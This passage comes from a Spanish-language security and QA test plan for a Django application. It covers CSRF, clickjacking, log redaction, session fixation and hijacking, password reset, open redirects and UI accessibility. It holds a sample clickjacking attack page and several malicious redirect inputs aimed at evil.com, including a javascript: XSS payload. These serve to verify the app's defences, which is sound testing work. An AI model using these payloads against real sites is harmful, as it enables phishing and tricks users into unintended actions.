**Tu aplicación está protegida contra CSRF porque:**
- ✅ `CsrfViewMiddleware` está activo
- ✅ `{% csrf_token %}` se incluye en todos los formularios POST
- ✅ Same-Origin Policy del navegador impide lectura cross-origin
- ✅ Token aleatorio de 64 caracteres (imposible de adivinar)
- ✅ Cookie flags configurados correctamente (`Secure`, `SameSite`)

**El token visible en HTML NO es un problema de seguridad** - es el diseño correcto. La protección viene del navegador (SOP) que impide que sitios maliciosos lean el token.

**Configuración actual es segura.** Considera añadir `CSRF_COOKIE_HTTPONLY = True` solo si no usas AJAX (protección adicional contra XSS).

---

### SEG-05: Clickjacking Protection✅

**Objetivo:** Verificar que la aplicación no puede ser embebida en iframes maliciosos

**🎯 ¿Qué es Clickjacking?**
Es un ataque donde un atacante engaña al usuario para que haga clic en elementos ocultos dentro de un iframe invisible. El usuario cree que está haciendo clic en una página legítima, pero en realidad está interactuando con tu aplicación embebida de forma invisible.

**Ejemplo de ataque:**
```html
<!-- Página maliciosa del atacante -->
<iframe src="https://tuapp.com/admin/" style="opacity:0; position:absolute; z-index:9999;"></iframe>
<button style="position:absolute; top:100px; left:100px;">¡Gana un iPhone gratis!</button>
<!-- El usuario cree que hace clic en el botón, pero hace clic en el iframe invisible -->
```

**Protección:** Headers HTTP que impiden el embedding en iframes

---

#### ✅ **PRUEBA 1: Verificar Headers HTTP**

**Pasos:**
1. Abrir la aplicación en el navegador (local o Railway)
2. Hacer login exitoso
3. Abrir **DevTools** (F12)
4. Ir a la pestaña **Network**
5. Recargar la página (F5)
6. Hacer clic en la petición principal (la primera, generalmente el documento HTML)
7. Ir a la pestaña **Headers** → sección **Response Headers**

**✅ Resultado esperado:**
```http
X-Frame-Options: DENY
```

**📊 Estado actual:**
- [✅] `X_FRAME_OPTIONS = 'DENY'` configurado en `settings.py`
- [⚠️] `Content-Security-Policy: frame-ancestors 'none'` NO configurado (opcional pero recomendado)

**Interpretación:**
- ✅ **DENY**: Impide que CUALQUIER sitio embeba tu aplicación en un iframe
- ⚠️ **SAMEORIGIN**: Permitiría embedding solo desde tu mismo dominio (menos seguro)
- ❌ **ALLOWALL**: Sin protección (peligroso)

---

#### ✅ **PRUEBA 2: Intentar Embedding en Iframe (Test Real)**

**Pasos:**
1. Crear un archivo HTML de prueba en tu escritorio: `test_clickjacking.html`
2. Copiar el siguiente contenido:

```html
<!DOCTYPE html>
<html>
<head>
    <title>Test Clickjacking Protection</title>
</head>
<body>
    <h1>Test de Protección Clickjacking</h1>
    <p>Si la protección funciona, verás un error abajo:</p>
    
    <iframe 
        src="http://localhost:8000/accounts/login/" 
        width="800" 
        height="600"
        style="border: 2px solid red;">
    </iframe>
    
    <p style="margin-top: 20px;">
        <strong>Resultado esperado:</strong> 
        El iframe NO debe mostrar contenido. Debe aparecer un mensaje de error 
        en la consola del navegador.
    </p>
</body>
</html>
```

3. Abrir el archivo `test_clickjacking.html` en tu navegador
4. Abrir **DevTools → Console**
5. Observar el resultado

**✅ Resultado esperado:**
- El iframe aparece **vacío** o con mensaje de error
- En la **consola** aparece un error similar a:
  ```
  Refused to display 'http://localhost:8000/accounts/login/' in a frame because it set 'X-Frame-Options' to 'deny'.
  ```

**❌ Resultado INCORRECTO (vulnerabilidad):**
- El iframe muestra tu página de login completamente funcional
- Sin errores en consola
- → Tu aplicación estaría vulnerable a clickjacking

---

#### ✅ **PRUEBA 3: Test en Producción (Railway)**

Si tu aplicación está en Railway, repite la prueba 2 pero cambia la URL del iframe:

```html
<iframe 
    src="https://TU-APP.railway.app/accounts/login/" 
    width="800" 
    height="600">
</iframe>
```

**Importante:** Asegúrate de probar con:
- ✅ Página de login: `/accounts/login/`
- ✅ Dashboard: `/dashboard/` o `/`
- ✅ Páginas admin: `/admin/`

Todas deben estar protegidas.

---

#### 🔧 **Mejora Recomendada: Content Security Policy (CSP)**

Además de `X-Frame-Options`, se recomienda usar CSP para mayor compatibilidad con navegadores modernos:

**Instalar django-csp:**
```bash
pip install django-csp
```

**Agregar a `settings.py`:**
```python
MIDDLEWARE = [
    ...
    'csp.middleware.CSPMiddleware',  # Agregar después de SecurityMiddleware
    ...
]

# Configuración CSP
CSP_DEFAULT_SRC = ("'self'",)
CSP_FRAME_ANCESTORS = ("'none'",)  # Equivalente a X-Frame-Options: DENY
CSP_STYLE_SRC = ("'self'", "'unsafe-inline'")
CSP_SCRIPT_SRC = ("'self'", "'unsafe-inline'")
```

**Verificación:**
Después de implementar CSP, el header de respuesta debería incluir:
```http
Content-Security-Policy: frame-ancestors 'none'
```

---

#### 📋 **Checklist de Verificación**

- [ ] Header `X-Frame-Options: DENY` presente en respuestas HTTP
- [ ] Iframe test muestra error en consola del navegador
- [ ] Iframe NO muestra contenido de la aplicación
- [ ] Protección activa en todas las páginas (login, dashboard, admin)
- [ ] Protección activa en producción (Railway)
- [ ] (Opcional) Header `Content-Security-Policy: frame-ancestors 'none'` presente

---

#### 🎓 **Conclusión y Explicación Técnica**

**¿Por qué funciona esta protección?**

1. **Servidor Django** envía header `X-Frame-Options: DENY` en cada respuesta HTTP
2. **Navegador** recibe el header y verifica si la página está dentro de un iframe
3. Si está en un iframe → **Navegador bloquea el renderizado** y muestra error
4. Si es ventana principal → Navegador permite el renderizado normal

**¿Qué tipos de ataques previene?**
- ✅ **Clickjacking**: Botones/enlaces invisibles superpuestos
- ✅ **UI Redressing**: Interfaces engañosas que ocultan la verdadera acción
- ✅ **Cursorjacking**: Manipulación del cursor para engañar al usuario
- ✅ **Likejacking**: Hacer que usuarios den "like" sin saberlo

**Estado actual de tu aplicación:**
- ✅ **PROTEGIDA**: `X_FRAME_OPTIONS = 'DENY'` está configurado
- ⚠️ **Mejora recomendada**: Añadir CSP `frame-ancestors 'none'` para navegadores modernos
- ✅ **Sin vulnerabilidades conocidas** de clickjacking

**Configuración es adecuada para producción.** La mejora con CSP es opcional pero recomendada para defensa en profundidad.

---

### SEG-06: Password Exposure en Logs✅

**Objetivo:** Verificar que contraseñas NO se loguean

**Pasos:**
1. Intentar login fallido o exitoso
2. Revisar logs del sistema (Railway logs, archivos logs/, o consola)

**Verificación en logs:**
```
✅ CORRECTO: LOGIN FALLIDO | Email: test@example.com | IP: 192.168.1.1
✅ CORRECTO: password=*** (censurado por SensitiveDataFilter)
✅ CORRECTO: csrfmiddlewaretoken=*** (censurado)
❌ INCORRECTO: password=Password123 (visible en texto plano)
```

**Archivos a revisar:**
- Railway logs (Production)
- `logs/app.log` (Development)
- `logs/security.log` (Development)

**Filtro de seguridad:**
- Implementado en `core/logging_filters.py` → `SensitiveDataFilter`
- Activo en todos los handlers de logging (producción y desarrollo)
- Censura automáticamente: passwords, tokens CSRF, API keys, session IDs, tarjetas de crédito

**⚠️ NOTA IMPORTANTE:**
En Railway con Gunicorn, si ves output POST con passwords visibles, NO es un problema de tu código.
Es el comportamiento por defecto de servidores WSGI en modo verbose. El filtro `SensitiveDataFilter`
censura todos los logs de tu aplicación Django, pero no controla el output directo de Gunicorn/WSGI.

**Solución aplicada:**
- Filtro `SensitiveDataFilter` mejorado para detectar múltiples formatos de passwords
- Patrones regex actualizados para capturar: `password=X`, `password: X`, `"password":"X"`
- Censura aplicada a TODOS los handlers de logging (console_dev, console_prod, stderr)

---

### SEG-07: Session Fixation✅

**Objetivo:** Verificar regeneración de session ID tras login

**Pasos:**
1. Abrir `/accounts/login/` **sin autenticar**
2. Inspeccionar cookie `sessionid` → anotar valor
3. Hacer login exitoso
4. Verificar cookie `sessionid` nuevamente

**Resultado esperado:**
- ✅ Session ID **cambia** después del login
- ✅ Prevención de session fixation attack

---

### SEG-08: Brute Force en Password Reset✅

**Objetivo:** Verificar rate limiting en recuperación de contraseña

**Pasos:**
1. Navegar a `/accounts/password_reset/`
2. Ingresar email válido → enviar
3. **Inmediatamente** volver a enviar para mismo email
4. Repetir múltiples veces

**Resultado esperado:**
- ✅ Primera solicitud: Email enviado
- ✅ Solicitud 2+: Mensaje "Ya enviamos instrucciones. Espera 15 minutos"
- ✅ No se envían múltiples emails
- ✅ Cache key: `password_reset_{email}` válido por 15 minutos
- ✅ Log: `PASSWORD RESET BLOQUEADO | Razón: Solicitud reciente`

---

### SEG-09: Password Reset Token Security✅

**Objetivo:** Verificar seguridad de tokens de reseteo

**Pasos:**
1. Solicitar password reset
2. Copiar link del email: `/reset/<uidb64>/<token>/`
3. Usar el link → cambiar contraseña
4. **Intentar usar el mismo link nuevamente**

**Resultado esperado:**
- ❌ 2º uso: "El enlace ya no es válido"
- ✅ Token de un solo uso
- ✅ Timeout: 1 hora (`PASSWORD_RESET_TIMEOUT = 3600`)

**Pruebas adicionales:**
- Token expirado (esperar >1 hora)
- Token modificado manualmente
- UID de otro usuario

**Prueba de reuso de contraseña:**
1. Solicitar password reset
2. En el formulario, intentar poner la **misma contraseña anterior**
3. **Resultado esperado:**
   - ❌ Error: "Por seguridad, no puedes usar tu contraseña anterior"
   - ✅ No permite reutilizar la contraseña anterior
   - ✅ Log: `PASSWORD RESET BLOQUEADO | Razón: Intentó usar la misma contraseña anterior`
   - ✅ Icono de ojo para mostrar/ocultar contraseñas

---

### SEG-10: Información en Mensajes de Error

**Objetivo:** Prevenir enumeración de usuarios✅ 

**Casos:**

| Escenario | Mensaje mostrado | ¿Revela info? |
|-----------|------------------|---------------|
| Email no existe + password cualquiera | "Credenciales inválidas" | ❌ No |
| Email existe + password incorrecta | "Credenciales inválidas" | ❌ No |
| Cuenta inactiva | "Tu cuenta está inactiva" | ✅ Sí (intencional) |
| Password reset - email no existe | "Si el email existe, recibirás instrucciones" | ❌ No |

**Verificación:**
- Mensajes genéricos no deben revelar si un email existe
- Solo logs internos tienen información detallada

---

## 🔐 ESCENARIOS DE CONTROL DE ACCESO

### ACC-01: Cuenta Inactiva✅ 

**Objetivo:** Verificar bloqueo de cuentas desactivadas

**Pre-requisitos:**
- Usuario con `is_active=False`

**Pasos:**
1. Intentar login con credenciales válidas
2. Verificar mensaje de error

**Resultado esperado:**
- ❌ Login bloqueado
- ✅ Mensaje específico: "Tu cuenta está inactiva. Contacta con el administrador"
- ✅ Log WARNING: `LOGIN BLOQUEADO - CUENTA INACTIVA`
- ✅ Validación en formulario (`CustomAuthenticationForm.clean()`)

---

### ACC-02: Usuario sin Organización ✅ BLOQUEADO

**Objetivo:** Verificar que NO se puedan crear usuarios activos sin organización

**Validación implementada:**
```python
# apps/accounts/signals.py - validate_user_organization()
if (instance.is_active and 
    not instance.is_superuser and 
    not instance.organization):
    raise ValidationError(
        "Los usuarios activos deben tener una organización asignada"
    )
```

**Regla de negocio:**
- ✅ Los **superusers** SÍ pueden tener `organization=NULL` (usan solo el admin)
- ❌ Los **usuarios regulares activos** NO pueden tener `organization=NULL`
- ⚠️ Los **usuarios inactivos** SÍ pueden tener `organization=NULL` (edge case)

---

#### **Prueba 1: Intentar crear usuario activo sin org desde Admin**

**Pasos:**
1. Login como superuser: `http://localhost:8000/admin/`
2. Ir a: **Usuarios** → **Agregar usuario**
3. Llenar campos:
   - Email: `sin_org@test.com`
   - First name: `Usuario`
   - Last name: `Sin Org`
   - **Organization: (dejar vacío)** ← KEY
   - is_active: ✅ **marcado**
4. Hacer clic en **Guardar**

**Resultado esperado:**
- ❌ Error: `ValidationError at /admin/accounts/user/add/`
- ❌ Mensaje: **"Los usuarios activos deben tener una organización asignada"**
- ✅ El usuario **NO se crea**
- ✅ Signal `validate_user_organization` bloquea la creación

---

#### **Prueba 2: Crear usuario INACTIVO sin org (edge case)**

**Pasos:**
1. Mismo proceso que arriba, pero:
   - is_active: ❌ **desmarcado**
   - Organization: (vacío)
2. Guardar

**Resultado esperado:**
- ✅ Usuario se crea **exitosamente** (porque está inactivo)
- ⚠️ Este usuario NO podrá hacer login (cuenta inactiva)
- 💡 Es un escenario válido: usuario desactivado sin org

---

#### **Prueba 3: Intentar activar usuario sin org**

**Pre-requisito:** Tener un usuario inactivo sin org (creado en Prueba 2)

**Pasos:**
1. En el admin, editar el usuario `sin_org@test.com`
2. Cambiar `is_active` de ❌ a ✅
3. **SIN asignar organización**
4. Guardar

**Resultado esperado:**
- ❌ Error: `ValidationError`
- ❌ Mensaje: "Los usuarios activos deben tener una organización asignada"
- ✅ El cambio **NO se guarda**

---

#### **Prueba 4: Intentar crear mediante Django Shell (bypass admin)**

```python
python manage.py shell

from apps.accounts.models import User

# Intentar crear usuario activo sin org
try:
    user = User.objects.create_user(
        email='sin_org_shell@test.com',
        password='Test1234!',
        first_name='Usuario',
        last_name='Shell',
        organization=None
    )
    user.is_active = True
    user.save()  # ← Aquí debe fallar
    print("❌ ERROR: El usuario se creó (no debería)")
except Exception as e:
    print(f"✅ CORRECTO: Bloqueado - {e}")

exit()
```

**Resultado esperado:**
- ❌ `ValidationError: Los usuarios activos deben tener una organización asignada`
- ✅ El signal bloquea incluso creaciones programáticas

---

#### **Prueba 5: Crear superuser sin org (debe permitirse)**

```python
python manage.py shell

from apps.accounts.models import User

try:
    superuser = User.objects.create_superuser(
        email='super_sin_org@test.com',
        password='SuperTest1234!',
        first_name='Super',
        last_name='User',
        organization=None  # ← Los superusers SÍ pueden no tener org
    )
    print(f"✅ Superuser creado sin org: {superuser.email}")
except Exception as e:
    print(f"❌ ERROR inesperado: {e}")

exit()
```

**Resultado esperado:**
- ✅ Superuser se crea **exitosamente** sin organización
- ✅ Es el comportamiento correcto (superusers solo usan `/admin/`)

---

#### **Comportamiento en Desarrollo vs Producción:**

**En DESARROLLO (`DEBUG=True`):**
- ❌ Muestra pantalla de error completa de Django con el traceback
- 📋 Aparece: `ValidationError at /admin/accounts/user/add/`
- 🔍 Muestra todo el stack trace y variables locales
- 💻 Útil para debugging

**En PRODUCCIÓN (`DEBUG=False`):**
- ✅ **NO muestra pantalla de error de Django**
- ✅ Django Admin captura el `ValidationError` automáticamente
- ✅ Muestra mensaje amigable al usuario en el formulario
- 📝 Mensaje: "Los usuarios activos deben tener una organización asignada"
- 🎨 Aparece como error de validación del formulario (borde rojo)
- 📊 El error SÍ se loguea internamente pero el usuario no ve el traceback

**Cómo funciona:**
```python
# Django Admin automáticamente captura ValidationError de signals
# y los muestra como errores de formulario, no como páginas de error

# Si DEBUG=False:
#   1. Signal lanza ValidationError
#   2. Django Admin lo captura
#   3. Muestra mensaje en el formulario (UI limpia)
#   4. Usuario puede corregir y reintentar

# Si DEBUG=True:
#   1. Signal lanza ValidationError
#   2. Django muestra página de error completa (para debugging)
```

---

#### **Conclusión:**

✅ **El sistema está correctamente protegido:**
- Usuarios regulares activos **DEBEN** tener organización
- Signal `validate_user_organization` previene inconsistencias
- Superusers son la **única excepción** válida
- En producción, el error se maneja **elegantemente** sin asustar al usuario
- Esta prueba confirma la **integridad de datos** del sistema

**Esta prueba NO requiere testing de login** porque no es posible crear el escenario de usuario activo sin organización.

---

### ACC-03: Redirección Post-Login✅

**Objetivo:** Verificar parámetro `?next=`

**¿Cómo funciona?**
- `CustomLoginView` hereda de `LoginView` de Django
- Django automáticamente lee el parámetro `?next=` y valida que sea una URL interna
- Si `next` es válido → redirige ahí; si no → usa `LOGIN_REDIRECT_URL = '/'`

---

#### **Prueba 1: Redirección Normal**

**Pasos:**
1. **Cerrar sesión** (si estás autenticado)
2. Intentar acceder directamente a: `http://localhost:8000/projects/`
3. Observar URL de redirección
4. Hacer login con credenciales válidas

**Resultado esperado:**
- ✅ Sistema redirige automáticamente a: `/accounts/login/?next=/projects/`
- ✅ Después del login → redirige a `/projects/` (NO al dashboard `/`)
- ✅ Log: `LOGIN EXITOSO | ...` (sin mencionar `next` internamente)

---

#### **Prueba 2: Sin parámetro `next`**

**Pasos:**
1. **Cerrar sesión**
2. Ir manualmente a: `http://localhost:8000/accounts/login/`
3. Hacer login

**Resultado esperado:**
- ✅ Después del login → redirige a `/` (dashboard)
- ✅ No hay parámetro `?next=` en la URL

---

#### **🔒 Prueba 3: Seguridad - URL Externa Absoluta**

**Objetivo:** Verificar que Django bloquea redirecciones a sitios externos

**Pasos:**
1. **Cerrar sesión**
2. Copiar y pegar en el navegador:
   ```
   http://localhost:8000/accounts/login/?next=https://evil.com
   ```
3. Hacer login

**Resultado esperado:**
- ✅ Después del login → **IGNORA** el `?next=` malicioso
- ✅ Redirige a `/` (default seguro)
- ✅ **NO** redirige a `evil.com`

**¿Por qué es seguro?**
- Django usa `url_has_allowed_host_and_scheme()` para validar
- Solo acepta URLs internas del mismo dominio

---

#### **🔒 Prueba 4: Seguridad - Protocol-Relative URL**

**Objetivo:** Verificar protección contra `//evil.com` (truco común)

**Pasos:**
1. **Cerrar sesión**
2. Copiar y pegar:
   ```
   http://localhost:8000/accounts/login/?next=//evil.com
   ```
3. Hacer login

**Resultado esperado:**
- ✅ Redirige a `/` (default seguro)
- ✅ **NO** redirige a `//evil.com`

---

#### **🔒 Prueba 5: Seguridad - JavaScript Injection**

**Pasos:**
1. **Cerrar sesión**
2. Intentar:
   ```
   http://localhost:8000/accounts/login/?next=javascript:alert('XSS')
   ```
3. Hacer login

**Resultado esperado:**
- ✅ Redirige a `/` (default seguro)
- ✅ **NO** ejecuta el JavaScript

---

#### **🔒 Prueba 6: Seguridad - URL Encoding**

**Pasos:**
1. **Cerrar sesión**
2. Intentar URL codificada:
   ```
   http://localhost:8000/accounts/login/?next=%2F%2Fevil.com
   ```
   (Es `//evil.com` codificado)
3. Hacer login

**Resultado esperado:**
- ✅ Django decodifica y valida correctamente
- ✅ Redirige a `/` (NO a `evil.com`)

---

#### **✅ Prueba 7: URL Interna Válida con Query Params**

**Pasos:**
1. **Cerrar sesión**
2. Ir a:
   ```
   http://localhost:8000/accounts/login/?next=/projects/?status=active
   ```
3. Hacer login

**Resultado esperado:**
- ✅ Redirige correctamente a `/projects/?status=active`
- ✅ Preserva los query params

---

#### **Verificación en Código**

Si quieres confirmar la validación, busca en el código fuente de Django:
```python
# django/contrib/auth/views.py (LoginView)
def get_success_url(self):
    url = self.get_redirect_url()
    return url or resolve_url(settings.LOGIN_REDIRECT_URL)

def get_redirect_url(self):
    redirect_to = self.request.POST.get(
        self.redirect_field_name,
        self.request.GET.get(self.redirect_field_name, '')
    )
    url_is_safe = url_has_allowed_host_and_scheme(
        url=redirect_to,
        allowed_hosts=self.get_success_url_allowed_hosts(),
        require_https=self.request.is_secure(),
    )
    return redirect_to if url_is_safe else ''
```

**Resumen:**
- ✅ Django valida automáticamente todas las URLs de redirección
- ✅ No necesitas implementar validación adicional
- ✅ Está protegido contra: URLs externas, protocol-relative, JavaScript, encoding attacks

---

### ACC-04: Acceso a Login Estando Autenticado✅

**Objetivo:** Verificar comportamiento si usuario ya tiene sesión

**Pasos:**
1. Usuario ya autenticado
2. Navegar manualmente a `/accounts/login/`

**Resultado esperado:**
- ✅ Redirección automática a dashboard (`/`)
- **O** mostrar página de login con mensaje: "Ya has iniciado sesión"

---

### ACC-05: Superuser Restringido de App Normal✅

**Objetivo:** Verificar middleware `SuperuserRestrictMiddleware`

**Pre-requisitos:**
- Superusuario autenticado

**Pasos:**
1. Login como superuser
2. Intentar navegar a rutas normales:
   - `/`
   - `/projects/`
   - `/users/`

**Resultado esperado:**
- ✅ Todas las rutas redirigen a `/admin/`
- ✅ Solo `/admin/`, `/accounts/logout/`, `/static/` accesibles
- ✅ Mensaje info: "Bienvenido al panel administrativo"

---

### ACC-06: Cambio Forzado de Contraseña

**Objetivo:** Verificar flujo de primer login

**Pre-requisitos:**
- Usuario con `password_change_required=True`

**Pasos:**
1. Login con credenciales válidas
2. Verificar redirección automática
3. Intentar acceder a otras rutas

**Resultado esperado:**
- ✅ Redirección a `/accounts/force-password-change/`
- ✅ **Todas las rutas** redirigen ahí (middleware `PasswordChangeRequiredMiddleware`)
- ✅ Solo accesibles: `/accounts/force-password-change/`, `/accounts/logout/`, `/static/`
- ✅ Log: `PASSWORD CHANGE REQUIRED`

**Cambio de contraseña:**
1. Ingresar contraseña actual
2. Ingresar nueva contraseña (2 veces)
3. Submit

**Resultado:**
- ✅ Flag `password_change_required` → `False`
- ✅ Sesión actualizada (no requiere re-login)
- ✅ Redirección a dashboard
- ✅ Mensaje: "¡Contraseña cambiada exitosamente!"
- ✅ Log: `PASSWORD CHANGE EXITOSO`

---

## ⏱️ ESCENARIOS DE SESIÓN

### SES-01: Duración de Sesión - Sin "Recordarme"✅

**Objetivo:** Verificar expiración de sesión por defecto

**Configuración:**
- `SESSION_COOKIE_AGE = 604800` (7 días)

**Pasos:**
1. Navegar a `/accounts/login/`
2. Ingresar credenciales válidas
3. ⚠️ **IMPORTANTE: NO marcar el checkbox "Recordarme por 30 días"** (dejarlo sin marcar)
4. Hacer clic en "Iniciar Sesión"
5. Abrir DevTools → Application → Cookies → buscar `sessionid`
6. Verificar el campo "Expires"

**Resultado esperado:**
- ✅ Cookie con expiración: **7 días** desde ahora (aproximadamente `2025-11-12T21:45:33.382Z` si haces login el 05/11/2025)
- ✅ `SESSION_EXPIRE_AT_BROWSER_CLOSE = False` (mantiene sesión)
- ✅ Log indica: `Sesión: 7 días`

---

### SES-02: Duración de Sesión - Con "Recordarme"✅

**Objetivo:** Verificar que el checkbox "Recordarme" extiende la sesión a 30 días

**Pasos:**
1. Navegar a `/accounts/login/`
2. Ingresar credenciales válidas
3. ✅ **MARCAR el checkbox "Recordarme por 30 días"** (hacer clic en él)
4. Hacer clic en "Iniciar Sesión"
5. Abrir DevTools → Application → Cookies → buscar `sessionid`
6. Verificar el campo "Expires"

**Resultado esperado:**
- ✅ Cookie con expiración: **30 días** desde ahora (2592000 segundos)
- ✅ Si haces login el 05/11/2025, la expiración debe ser aproximadamente `2025-12-05T21:45:33.382Z`
- ✅ Log indica: `Sesión: 30 días`

**⚠️ NOTA IMPORTANTE:**
Si obtienes 7 días en lugar de 30, verifica que:
1. **Marcaste el checkbox** "Recordarme por 30 días" antes de hacer login
2. El checkbox tiene el atributo `name="remember_me"`
3. El campo aparece en el formulario POST (verificar en DevTools → Network → Payload)

---

### SES-03: Cerrar Navegador - Sesión Persistente✅

**Pasos:**
1. Hacer login
2. Cerrar completamente el navegador
3. Reabrir navegador
4. Navegar a la app

**Resultado esperado:**
- ✅ Usuario **sigue autenticado**
- ✅ No requiere volver a hacer login
- ✅ Configuración: `SESSION_EXPIRE_AT_BROWSER_CLOSE = False`

---

### SES-04: Sesión Expirada✅

**Objetivo:** Verificar comportamiento con sesión expirada

**Pasos simulados:**
1. Login exitoso
2. **Simular** expiración (eliminar cookie en DevTools o modificar timestamp en BD)
3. Intentar acceder a ruta protegida

**Resultado esperado:**
- ✅ Redirección a `/accounts/login/?next=/ruta-protegida/`
- ✅ No hay error 500

---

### SES-05: Múltiples Sesiones Simultáneas✅

**Objetivo:** Verificar comportamiento multi-dispositivo

**Pasos:**
1. Login en navegador A (Chrome)
2. Login en navegador B (Firefox) con mismo usuario
3. Verificar acceso en ambos

**Resultado esperado:**
- ✅ Ambas sesiones activas simultáneamente
- ✅ Logout en A no afecta sesión en B
- ✅ Cada sesión tiene ID único

---

### SES-06: Limpieza de Flags de Sesión✅

**Objetivo:** Verificar limpieza de variables temporales

**Flags que deben limpiarse en login:**
```python
'admin_welcome_shown'
'subscription_warning_expired_shown'
'subscription_warning_expires_soon_shown'
'subscription_warning_user_limit_exceeded_shown'
'subscription_warning_no_subscription_shown'
'subscription_warning_validation_error_shown'
```

**Pasos:**
1. Crear sesión con flags establecidos
2. Hacer logout
3. Volver a hacer login
4. Verificar en sesión que flags no existan

**Resultado esperado:**
- ✅ Flags eliminados en login y logout
- ✅ Sesión limpia para cada login

---

### SES-07: Session Hijacking Prevention ✅

**Objetivo:** Verificar validación de User-Agent/IP para prevenir sesiones robadas

**Middleware implementado:** `SessionValidationMiddleware` + `SessionMetadataMiddleware`

**Pasos para probar:**
1. Login exitoso con cuenta válida
2. Navegar al Dashboard (esto guarda tu User-Agent original)
3. Abrir DevTools (F12) → Console → Ctrl+Shift+P → "Network conditions"
4. Desmarcar "Use browser default"
5. Seleccionar un User-Agent diferente (ej: "Safari - iPad")
6. **Navegar a otra página o recargar**

**Resultado esperado:**
- ✅ Sesión invalidada automáticamente
- ✅ Redirect a `/login/` con mensaje: "Tu sesión ha sido cerrada por razones de seguridad"
- ✅ Log: `SESSION HIJACKING DETECTED | User: ...`

**Configuración:**
- `SESSION_VALIDATE_USER_AGENT = True` (habilitado por defecto)
- `SESSION_VALIDATE_IP = False` (deshabilitado - puede causar problemas con móviles)

**Recomendación de seguridad:**
- ✅ Validación de User-Agent implementada
- ⚠️ En producción, considerar agregar validación de IP para cambios drásticos (configurar `SESSION_VALIDATE_IP=True`)

---

## 🔄 ESCENARIOS DE RECUPERACIÓN DE CONTRASEÑA

### PWD-01: Password Reset - Happy Path

**Pasos:**
1. Click en "¿Olvidaste tu contraseña?"
2. Ingresar email registrado
3. Click "Enviar instrucciones"
4. Revisar email recibido
5. Click en enlace
6. Ingresar nueva contraseña (2 veces)
7. Submit

**Resultado esperado:**
- ✅ Mensaje: "Te enviamos instrucciones por correo"
- ✅ Email recibido con enlace único
- ✅ Enlace formato: `/reset/<uidb64>/<token>/`
- ✅ Formulario de nueva contraseña cargado
- ✅ Contraseña cambiada exitosamente
- ✅ Mensaje: "Tu contraseña ha sido restablecida"
- ✅ Login con nueva contraseña funciona

---

### PWD-02: Password Reset - Email No Registrado

**Pasos:**
1. Solicitar reset con email inexistente: `noexiste@example.com`

**Resultado esperado:**
- ✅ Mensaje genérico: "Te enviamos instrucciones" (mismo que usuario válido)
- ❌ **No se envía email**
- ✅ Log: `PASSWORD RESET | Email NO registrado`
- ⚠️ No revela si el email existe (prevención enumeración)

---

### PWD-03: Password Reset - Validación de Nueva Contraseña

**Objetivo:** Verificar validadores de Django

**Casos de prueba:**

| Nueva contraseña | ¿Válida? | Error esperado |
|-----------------|----------|----------------|
| `abc123` | ❌ | "Muy corta (mín. 8 caracteres)" |
| `12345678` | ❌ | "Completamente numérica" |
| `password` | ❌ | "Demasiado común" |
| `Test@1234` | ✅ | Aceptada |

**Validadores activos:**
```python
UserAttributeSimilarityValidator
MinimumLengthValidator (8 caracteres)
CommonPasswordValidator
NumericPasswordValidator
```

---

### PWD-04: Password Reset - Contraseñas No Coinciden

**Pasos:**
1. Ingresar nueva contraseña: `NewPass123!`
2. Confirmar con: `NewPass456!` (diferente)
3. Submit

**Resultado esperado:**
- ❌ Error: "Las contraseñas no coinciden"
- ❌ No se guarda la contraseña

---

### PWD-05: Force Password Change - Contraseña Actual Incorrecta

**Pre-requisitos:**
- Usuario con `password_change_required=True`

**Pasos:**
1. Login → redirección a force password change
2. Ingresar contraseña actual **incorrecta**
3. Ingresar nueva contraseña válida
4. Submit

**Resultado esperado:**
- ❌ Error: "La contraseña actual no es correcta"
- ❌ No se cambia la contraseña

---

### PWD-06: Force Password Change - Nueva = Actual

**Pasos:**
1. En force password change
2. Ingresar contraseña actual: `OldPass123`
3. Ingresar nueva contraseña: `OldPass123` (misma)
4. Submit

**Resultado esperado:**
- ❌ Error: "La nueva contraseña debe ser diferente a la actual"

---

### PWD-07: Force Password Change - Bypass Attempt

**Objetivo:** Verificar seguridad del middleware

**Pasos:**
1. Usuario con `password_change_required=True`
2. Login exitoso → redirigido a force change
3. **Intentar** navegar directamente a `/` en la URL

**Resultado esperado:**
- ✅ Middleware intercepta
- ✅ Redirección forzada a `/accounts/force-password-change/`
- ✅ No puede acceder a ninguna ruta hasta cambiar contraseña

---

## 🎨 ESCENARIOS DE UI/UX

### UI-01: Responsive Design - Mobile✅ 

**Dispositivos de prueba:**
- iPhone SE (375x667)
- iPhone 12 Pro (390x844)
- iPad (768x1024)
- Samsung Galaxy S20 (360x800)

**Verificaciones:**
1. Formulario visible sin scroll horizontal
2. Botones táctiles adecuados (mín. 44x44px)
3. Inputs con tamaño de fuente mínimo 16px (evita zoom en iOS)
4. Logo e imágenes escaladas correctamente
5. Checkbox "Recordarme" clickable fácilmente

---

### UI-02: Toggle de Mostrar/Ocultar Contraseña✅ 

**Pasos:**
1. Navegar a login
2. Ingresar contraseña
3. Click en ícono de ojo (`.password-toggle`)

**Resultado esperado:**
- ✅ Input cambia de `type="password"` a `type="text"`
- ✅ Contraseña visible en texto plano
- ✅ Ícono cambia a `mdi-eye-off-outline`
- ✅ Click nuevamente → vuelve a ocultar

---

### UI-03: Accesibilidad - Navegación con Teclado✅ 
**Pasos:**
1. Cargar página de login
2. Usar solo teclado:
   - `Tab` → focus en email
   - Escribir email
   - `Tab` → focus en password
   - Escribir password
   - `Tab` → focus en checkbox "Recordarme"
   - `Space` → marcar/desmarcar
   - `Tab` → focus en botón "Iniciar Sesión"
   - `Enter` → submit

**Resultado esperado:**
- ✅ Orden lógico de tabulación
- ✅ Focus visible en cada elemento
- ✅ Submit funciona con Enter
- ✅ No hay trampas de teclado

---

### UI-04: Accesibilidad - Lectores de Pantalla✅ 

**Herramientas:** NVDA (Windows), VoiceOver (macOS), JAWS

**Verificaciones:**
1. Labels asociados correctamente a inputs:
   ```html
   <label for="id_username">Correo electrónico</label>
   <input id="id_username" ...>
   ```
2. Mensajes de error anunciados:
   - `aria-live="polite"` en alerts
3. Botón de toggle password:
   - `aria-label="Toggle password visibility"`
4. Formulario tiene `role="form"` o estructura semántica

---

### UI-05: Estados de Validación Visual✅ 

**Casos:**

| Estado | Estilo visual esperado |
|--------|----------------------|
| Campo vacío (pristine) | Border gris normal |
| Campo con focus | Border azul, posible sombra |
| Error de validación | Border rojo, mensaje error rojo |
| Input válido | Border verde (opcional) |

**Verificar en:**
- Validación HTML5 (email inválido)
- Errores de backend (credenciales incorrectas)

---

### UI-06: Mensajes de Error - Persistencia✅ 
**Pasos:**
1. Login fallido → mensaje de error mostrado
2. Modificar email/password
3. **NO** hacer submit
